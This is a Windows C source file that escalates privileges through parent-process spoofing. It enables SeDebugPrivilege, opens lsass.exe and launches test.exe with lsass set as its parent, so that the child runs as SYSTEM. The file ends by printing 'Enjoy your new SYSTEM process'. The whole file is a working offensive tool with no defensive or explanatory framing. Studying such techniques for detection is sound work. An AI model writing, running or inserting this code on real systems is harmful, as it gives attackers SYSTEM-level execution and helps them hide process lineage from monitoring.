#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <tchar.h>

// Function to enable or disable privileges for a given token
BOOL SetPrivilege(HANDLE hToken, LPCTSTR Privilege, BOOL bEnablePrivilege) {
    TOKEN_PRIVILEGES tp;
    LUID luid;
    TOKEN_PRIVILEGES tpPrevious;
    DWORD cbPrevious = sizeof(TOKEN_PRIVILEGES);

    // Lookup privilege value by name
    if (!LookupPrivilegeValue(NULL, Privilege, &luid))
        return FALSE;

    // Prepare privilege structure
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = 0;

    // Adjust token privileges
    AdjustTokenPrivileges(
        hToken,
        FALSE,
        &tp,
        sizeof(TOKEN_PRIVILEGES),
        &tpPrevious,
        &cbPrevious
    );

    // Check for errors
    if (GetLastError() != ERROR_SUCCESS)
        return FALSE;

    // Prepare previous privilege structure for further adjustments
    tpPrevious.PrivilegeCount = 1;
    tpPrevious.Privileges[0].Luid = luid;

    // Enable or disable the privilege
    if (bEnablePrivilege) {
        tpPrevious.Privileges[0].Attributes |= (SE_PRIVILEGE_ENABLED);
    } else {
        tpPrevious.Privileges[0].Attributes ^= (SE_PRIVILEGE_ENABLED & tpPrevious.Privileges[0].Attributes);
    }

    // Adjust token privileges again
    AdjustTokenPrivileges(
        hToken,
        FALSE,
        &tpPrevious,
        cbPrevious,
        NULL,
        NULL
    );

    // Check for errors
    if (GetLastError() != ERROR_SUCCESS)
        return FALSE;

    return TRUE;
}

// Function to enable SeDebugPrivilege for current thread
DWORD EnableDebug(void) {
    HANDLE hToken;

    // Open thread token with necessary privileges
    if (!OpenThreadToken(GetCurrentThread(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, FALSE, &hToken)) {
        // If no token exists, impersonate the thread to create one
        if (GetLastError() == ERROR_NO_TOKEN) {
            if (!ImpersonateSelf(SecurityImpersonation))
                return 0;

            if (!OpenThreadToken(GetCurrentThread(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, FALSE, &hToken)) {
                printf("OpenThreadToken");
                return 0;
            }
        } else {
            return 0;
        }
    }

    // Enable SeDebugPrivilege
    if (!SetPrivilege(hToken, SE_DEBUG_NAME, TRUE)) {
        printf("Error SetPrivilege");

        // Close token handle on failure
        CloseHandle(hToken);

        return 0;
    }

    // Success message
    printf("SeDebug privilege is enabled.\n");

    return 1;
}

// Fnd process ID by name using a snapshot
DWORD FindProcessId(const char* processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }

    // Iterate through processes to find matching process name
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);
    if (!Process32First(hSnapshot, &pe)) {
        CloseHandle(hSnapshot);
        return 0;
    }

    DWORD pid = 0;
    do {
        if (strcmp(pe.szExeFile, processName) == 0) {
            pid = pe.th32ProcessID;
            break;
        }
    } while (Process32Next(hSnapshot, &pe));

    CloseHandle(hSnapshot);
    return pid;
}

int main(int argc, char **argv) {
    int pid;
    HANDLE pHandle = NULL;
    STARTUPINFOEXA si;
    PROCESS_INFORMATION pi;
    SIZE_T size;
    BOOL ret;

    // Find the PID of lsass.exe
    pid = FindProcessId("lsass.exe");
    if (pid == 0) {
        printf("Error: Could not find lsass.exe process\n");
        return 1;
    }

    // Enable SeDebugPrivilege
    if (!EnableDebug()) {
        printf("Failed to enable SeDebugPrivilege\n");
        return 1;
    }

    // PROCESS_ALL_ACCESS not needed in this instance
    pHandle = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, pid);
    if (pHandle == NULL) {
        printf("Error opening PID %d (Error Code: %d)\n", pid, GetLastError());
        return 2;
    }

    // Prepare attribute list for creating the new process
    ZeroMemory(&si, sizeof(STARTUPINFOEXA));
    InitializeProcThreadAttributeList(NULL, 1, 0, &size);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(
        GetProcessHeap(),
        0,
        size
    );
    InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);
    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &pHandle, sizeof(HANDLE), NULL, NULL);
    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);

    // Create the new process (test.exe) with extended startup information
    ret = CreateProcessA(
        NULL,                         
        "test.exe",                   
        NULL,
        NULL,
        TRUE,
        EXTENDED_STARTUPINFO_PRESENT, 
        NULL,
        NULL,
        (LPSTARTUPINFOA)&si,
        &pi
    );

    // Check for creation success
    if (ret == FALSE) {
        printf("Error creating new process (%d)\n", GetLastError());
        return 3;
    }

    // Success message
    printf("Enjoy your new SYSTEM process\n");

    // Terminate current process (main.exe) after starting test.exe
    ExitProcess(0);

    return 0;
}
